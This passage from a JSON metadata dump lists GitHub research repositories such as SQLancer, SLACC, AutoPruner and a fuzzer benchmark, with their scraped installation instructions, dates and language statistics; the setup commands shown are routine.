    },
    "836": {
        "filename": "pmorvalho_InvAASTCluster_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/pmorvalho/InvAASTCluster",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "+ Python 3.8.5\n+ [pycparser](https://github.com/eliben/pycparser) : version 2.21\n  ```\n  pip install pycparser==2.21\n  ```\n+ numpy : version 1.19.2\n  ```\n  pip install numpy==1.19.2\n  ```\n\n+ Clara\n\n   Clara is the program repair framework used. Clara should be installed as a submodule in the subdirectory \"InvAASTCluster/clara\". To install Clara, follow the instructions available on https://github.com/iradicek/clara. The user should create a conda environment called \"clara\" to run clara with our scripts.\n\n+ Daikon\n\n  Daikon was used to compute dynamically-generated likely invariants observed over several program executions for each student submission using a set of predefined input-output tests for each programming assignment. To install Daikon follow the instructions available on https://plse.cs.washington.edu/daikon/download/.\n  \n+ runsolver\n\n  Runsolver was used to control the memory and CPU used and timeout while running the program clustering/repairing evaluations. To install Runsolver follow the instructions available on https://github.com/utpalbora/runsolver.\n\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation Requirements",
                    "parent_header": [
                        "InvAASTCluster: On Applying Invariant-Based Program Clustering to Introductory Programming Assignments"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/pmorvalho/InvAASTCluster/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-06-27T12:19:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-11T07:11:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 5150784
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 110163
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 34972
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 335
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "837": {
        "filename": "logpai_loghub_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/logpai/loghub",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<div>\n<a href=\"https://github.com/logpai/loghub/stargazers\"><img src=\"http://bytecrank.com/nastyox/reporoster/php/stargazersSVG.php?user=logpai&repo=loghub\" width=\"600\"/><a/>\n</div> \n\ud83e\udd17 We proudly announce that the loghub datasets have attained total <a href=\"https://doi.org/10.5281/zenodo.1144100\"><img src=\"https://img.shields.io/endpoint?&url=https://cdn.jsdelivr.net/gh/logpai/loghub@zenodo/downloads.json&labelColor=1AE&color=DDEEFF&style=flat&label=Downloads\"></a> by more than [**450 organizations**](https://github.com/logpai/loghub/wiki/Loghub-download-list) from both industry and academia.\n \n",
                    "original_header": "Loghub"
                },
                "confidence": 0.9998251516779907,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/logpai/loghub/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2016-06-08T14:51:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T09:43:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "838": {
        "filename": "roozbehaghili_studying_aiops_github_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/roozbehaghili/studying_aiops_github",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```bash\ngit clone https://github.com/AIOpsstudy/understanding_aiops\npip install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "Characteristics of AIOps Projects - Replication Package"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/roozbehaghili/studying_aiops_github/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-06-06T20:56:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-18T09:04:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 1059272
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 10027
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "839": {
        "filename": "sqlancer_sqlancer_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sqlancer/sqlancer",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We would appreciate it if you mention SQLancer when you report bugs found by it. We would also be excited to know if you are using SQLancer to find bugs, or if you have extended it to test another DBMS (also if you do not plan to contribute it to this project). SQLancer has found over 400 bugs in widely-used DBMS, which are listed [here](https://www.manuelrigger.at/dbms-bugs/). \n",
                    "original_header": "Found Bugs"
                },
                "confidence": 0.9997291252891082,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sqlancer/sqlancer/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-04-03T06:27:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T12:02:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 3801661
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 16962
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 3040
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 313
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "840": {
        "filename": "DynamicCodeSearch_SLACC_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/DynamicCodeSearch/SLACC",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# Installing SLACC\nSLACC can be setup from scratch on a [local machine](#setting-up-from-scratch) or a [preconfigured virtualbox](#preconfigured-image) image can be used. We would recommend the preconfigured virtualbox for prototyping and while setting up from scratch for replicating the ICSE results.\n\n## Preconfigured Image\nSetting up SLACC can be a cumbersome task. We have preset SLACC as a virtualbox image with the `CodeJam` dataset used in our study and a sample `Example` dataset which we used in the motivation section of our paper.\n\n### Setting up\n* First download the latest version of [VirtualBox](https://www.virtualbox.org/wiki/Downloads) for your operating system.\n* Download the virtualbox image of [SLACC](https://drive.google.com/drive/u/3/folders/1UqWRvwiSy9ILwFMEDC6_bimzP2mg9m_T).\n* Open Virtualbox and import the image. `File -> Import Appliance`. Please note that the virtual box is configured for smaller experiments so it might not be ideal for large experiments like the one used in our paper.\n* **Hardware Requirements**: 8GB memory, 20GB storage(dynamically expands based on source code)\n\n### Navigating around\n* Once the image is booted up, it can be logged in using the credentials\n```\nUSER_NAME :  SLACC\nPASS_WORD: slacc\n```\n* The source code is already downloaded and unpacked in the folder `~/Raise/ProgramRepair/SLACC`. Navigate into this folder\n```\n> cd ~/Raise/ProgramRepair/SLACC\n```\n* Setting up DB. Check if mongoDB is running using the command `mongo`. If not start mongoDB using\n```\n> mongostart\n```\n* You are now set to use SLACC. No changes have to be made to the java or python properties. Head over to the [README](https://github.com/DynamicCodeSearch/SLACC/tree/ICSE20/README.md#running-slacc) to try out a on the `Example` dataset or the `CodeJam` dataset.\n\n\n## Setting up from Scratch\nClone SLACC from github using \n```\n> git clone https://github.com/DynamicCodeSearch/SLACC.git\n```\n\n### Hardware\n* SLACC requires atleast 4GB of memory to function on smaller programs. Storage and number of processors vary based on the size of the targe code for clone detection.\n* For the CodeJam dataset used in the paper, we used a 16 node cluster 4-core AMD opteron processor and 32GB DDR3 1333 ECCDRAM. This took around 2 hours for SLACC to identify clusters in the dataset.\n\n### Java\n* SLACC requires [JDK version 1.8](https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html). After downloading this version configure the environment variable **$JAVA_HOME** to the path where Java is installed.\n* We also use [maven version 3.3+](https://maven.apache.org/download.cgi). Make sure you can access the maven command `mvn` form a command line window.\n* We would recommend a GUI like [Intellij Idea](https://www.jetbrains.com/idea/) or [Eclipse](https://www.eclipse.org/downloads/) if you plan on editing the source code.\n* The additional java dependecies can be installed by running `mvn clean install` in `SLACC/code` folder.\n\n### Python\n* We use python [2.7.6+](https://www.python.org/downloads/release/python-2716/). Make sure you can access `python` from the command line after installing python.\n* For managing python packages we use [pip 9.0+](https://pip.pypa.io/en/stable/installing/). Make sure you can access `pip` from the command line after installing pip.\n* To install required python libraries \n```\n> cd SLACC/code\n> pip install -r requirements.txt\n```\n\n### Database\n* Most of the data and meta-data used by SLACC is stored in MongoDB. We use [MongoDB 3.6](https://docs.mongodb.com/manual/installation/) for our experiments but it should work on later versions as well.\n* Set the environment variable **$MONGO_HOME** to the path where Mongo is installed.\n\n### Properties\nFinally the properties have to be set for Java and Python\n* Open `SLACC/code/src/main/java/edu/ncsu/config/Settings.java` and set the variable `ROOT_PATH` to the parent folder where SLACC is cloned.\n* Open `/SLACC/code/src/main/python/properties.py` and set the variable `ROOT_HOME` to the parent folder where SLACC is cloned.\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/DynamicCodeSearch/SLACC/master/INSTALL.md"
            },
            {
                "result": {
                    "value": "The artifacts for SLACC can be installed by following the instructions in [INSTALL.md](https://github.com/DynamicCodeSearch/SLACC/blob/ICSE20/INSTALL.md). SLACC can either be [setup from scratch](https://github.com/DynamicCodeSearch/SLACC/edit/ICSE20/INSTALL.md#setting-up-from-scratch) or reusing the preconfigured [virtualbox image](https://github.com/DynamicCodeSearch/SLACC/edit/ICSE20/INSTALL.md#preconfigured-image). We would recommend using the preconfigured image for prototyping or running the `Example` dataset used in the motivation section of the paper. For running the `CodeJam` dataset, it might be best to setup from the scratch or use the image on a machine with at least 16GB of memory and 2 processors.\n",
                    "type": "Text_excerpt",
                    "original_header": "Setting it up",
                    "parent_header": [
                        "SLACC: Simion-based Language Agnostic Code Clones"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/DynamicCodeSearch/SLACC/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-01-22T12:23:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-04T12:48:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 19037503
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1258610
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "ANTLR",
                    "name": "ANTLR",
                    "type": "Programming_language",
                    "size": 34991
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 25977
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 9391
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 3708
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "841": {
        "filename": "mvasiliniuc_iva-codeint-mobile_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mvasiliniuc/iva-codeint-mobile",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-06-16T09:09:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-28T07:34:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 44647
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "842": {
        "filename": "soarsmu_AutoPruner_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/soarsmu/AutoPruner",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "- More than 200GB disk space\n- 2 NVIDIA GPU that CUDA 11.3; supports and have at least 8GB memory.",
                    "type": "Text_excerpt",
                    "original_header": "Hardware",
                    "parent_header": [
                        "\u2699\ufe0fAutoPruner\u2702\ufe0f",
                        "\ud83d\udd27 Installations",
                        "Requirements"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/soarsmu/AutoPruner/main/README.md"
            },
            {
                "result": {
                    "value": "- Ubuntu 18.04 or newer\n- Docker/Conda\n ",
                    "type": "Text_excerpt",
                    "original_header": "Software",
                    "parent_header": [
                        "\u2699\ufe0fAutoPruner\u2702\ufe0f",
                        "\ud83d\udd27 Installations",
                        "Requirements"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/soarsmu/AutoPruner/main/README.md"
            },
            {
                "result": {
                    "value": "```\nconda env create -n autopruner --file environment.yml\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Conda",
                    "parent_header": [
                        "\u2699\ufe0fAutoPruner\u2702\ufe0f",
                        "\ud83d\udd27 Installations",
                        "Environment Configuration"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/soarsmu/AutoPruner/main/README.md"
            },
            {
                "result": {
                    "value": "For ease of use, we also provide a \ninstallation package via a [docker image](https://hub.docker.com/r/thanhlecong/autopruner). User can setup AutoPruner's docker step-by-step as follows:\n\n- Pull AutoPruner's docker image: \n```\ndocker pull thanhlecong/autopruner:v2\n```\n- Run a docker container:\n```\ndocker run --name autopruner -it --shm-size 16G --gpus all thanhlecong/autopruner:v2\n```\n- Activate conda:\n```\nsource /opt/conda/bin/activate\n```\n- Activate AutoPruner's conda enviroment: \n```\nconda activate autopruner\n```\nNote that, the source code of AutoPruner are stored at /workspace/ in Docker. So, please move to this folder before running experiments. \n\n",
                    "type": "Text_excerpt",
                    "original_header": "Docker",
                    "parent_header": [
                        "\u2699\ufe0fAutoPruner\u2702\ufe0f",
                        "\ud83d\udd27 Installations",
                        "Environment Configuration"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/soarsmu/AutoPruner/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "*by Thanh Le-Cong, Hong Jin Kang, Truong Giang Nguyen, Stefanus Agus Haryono, David Lo, Xuan-Bach D. Le, Quyet Thang Huynh*\n<p align=\"center\">\n    <a href=\"https://dl.acm.org/doi/abs/10.1145/3540250.3549175\"><img src=\"https://img.shields.io/badge/Conference-ESEC/FSE 2023-green?style=for-the-badge\">\n    <a href=\"https://arxiv.org/abs/2209.03230\"><img src=\"https://img.shields.io/badge/arXiv-2209.03230-b31b1b.svg?style=for-the-badge\">\n    <br>\n    <a href=\"https://zenodo.org/records/6369874\"><img src=\"https://img.shields.io/badge/Replication-10.5281%2Fzenodo.6369874-blue?style=for-the-badge\">\n    <a href=\"https://hub.docker.com/r/thanhlecong/autopruner\"><img src=\"https://img.shields.io/badge/docker-thanhlecong%2Fautopruner-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white\"></a>\n</p> \n",
                    "original_header": "\u2699\ufe0fAutoPruner\u2702\ufe0f"
                },
                "confidence": 0.9999953211433628,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/soarsmu/AutoPruner/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To replicate the ablation study of AutoPruner with strutural features, please use\n```\nbash script/rq3_structure.sh\n```\nTo replicate the ablation study of AutoPruner with semantic features, please use\n```\nbash script/rq3_semantic.sh\n```\nTo replicate the ablation study of AutoPruner with caller function, please use\n```\nbash script/rq3_caller.sh\n```\nTo replicate the ablation study of AutoPruner with callee function, please use\n```\nbash script/rq3_callee.sh\n```\n \n",
                    "original_header": "RQ3"
                },
                "confidence": 0.9854276910742108,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/soarsmu/AutoPruner/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-08-09T01:29:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-02T03:02:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 57088
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2083
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "843": {
        "filename": "microsoft_methods2test_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/microsoft/methods2test",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-08-05T05:13:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-27T08:20:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 18172
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "844": {
        "filename": "SAP_vulnerability-assessment-kb_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SAP/project-kb",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-02-13T16:19:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-17T15:25:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 432449
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 175369
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 123395
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 27418
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 24794
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 6843
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 4803
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 4408
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 3404
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 2063
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jinja",
                    "name": "Jinja",
                    "type": "Programming_language",
                    "size": 1008
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "845": {
        "filename": "reactive-systems_Lola2RustArtifact_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/reactive-systems/Lola2RustArtifact",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The difference between the executable and provable files is that the Viper code annotations are removed and the I/O functions were adapted accordingly.  You can compile an run the monitors by switching into the respective folder an run `cargo run --release`.  Note that you need to install Rust first, check it out [here](https://www.rust-lang.org/tools/install).\n \n",
                    "original_header": "Structure"
                },
                "confidence": 0.999929983985714,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/reactive-systems/Lola2RustArtifact/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-08-13T13:13:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-06-18T14:02:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 66841
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "846": {
        "filename": "yikun-li_satd-in-industry_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/yikun-li/satd-in-industry",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-06-27T19:45:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-12T07:51:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 16915
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "847": {
        "filename": "serperu_secer_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/serperu/secer",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "============\nSecEr makes use of the Erlang modules and tools [TypEr](https://github.com/erlang/typer), [PropEr](https://github.com/manopapad/proper), and [CutEr](https://github.com/aggelgian/cuter), so there are some prerequisites to use it.\nIn order to perform a correct execution of the tool, all [CutEr](https://github.com/aggelgian/cuter) dependencies need to be fulfiled ([CutEr dependencies](https://github.com/aggelgian/cuter/blob/master/README.md)). \n\n\t$ git clone --recursive https://github.com/serperu/secer.git\n\t$ cd secer/\n\t$ make \n\nThe first step clones the GitHub's repository content to the local system. Then, `make` is used to compile PropEr, CutEr and SecEr source files, leaving the tool ready to run.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/serperu/secer/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-06-05T11:00:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-23T01:04:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Erlang",
                    "name": "Erlang",
                    "type": "Programming_language",
                    "size": 452592
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 869
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 693
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 607
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "848": {
        "filename": "CISPA-SysSec_mua_fuzzer_bench_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/CISPA-SysSec/mua_fuzzer_bench",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To run this framework two dependencies are required.\n\nFirst, the required Python packages are managed using\n[hatch](https://hatch.pypa.io/latest/install/). See\n[Preparing the Environment](#preparing-the-environment) on how to use it.\nThe configuration can be found in [pyproject.toml](pyproject.toml), but we\n**discourage** manual setups.\n\nThe other requirement is [docker](https://docs.docker.com/engine/install/)\nand that the user is a member of the `docker` group.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/CISPA-SysSec/mua_fuzzer_bench/main/README.md"
            },
            {
                "result": {
                    "value": "Fuzzing requires some specific configurations, the recommended configuration\ncan be found in the `set_proc_sys_parameters.sh` file. Please check the\nfile to see if those changes are acceptable and modify if not.\n\nAdditionally, the framework requires a few python packages. The python\nenvironment is managed through [hatch](https://hatch.pypa.io/latest/).\nAll that needs to be installed is hatch, then `hatch shell` will set up the\npackages. We **strongly recommend** this over a manual setup.\n\n```bash\nsource ./set_proc_sys_parameters.sh  # source the script to allow ulimit to work\nhatch shell  # enter the python environment\n```\n\nExecuting the second command opens a shell in the virtual environment that has\nall dependencies installed. Afterwards, the following commands can be run in\nthis shell session.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Preparing the Environment",
                    "parent_header": [
                        "Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/CISPA-SysSec/mua_fuzzer_bench/main/README.md"
            },
            {
                "result": {
                    "value": "Changing mutations requires additional setup shown below.\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "Extending the Tool"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/CISPA-SysSec/mua_fuzzer_bench/main/README.md"
            },
            {
                "result": {
                    "value": "```shell script\n# use the python script mutator-docker-wrapper.py\n\n# first build the docker containers\npython3 mutator-docker-wrapper.py -b\n\n# then connect to the container\npython3 mutator-docker-wrapper.py -a\n\n# [optional] consult the script's help output for rebuilding and similar\n# (will be faster than the initial build)\npython3 mutator-docker-wrapper.py -h\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Docker Install",
                    "parent_header": [
                        "Extending the Tool",
                        "Install"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/CISPA-SysSec/mua_fuzzer_bench/main/README.md"
            },
            {
                "result": {
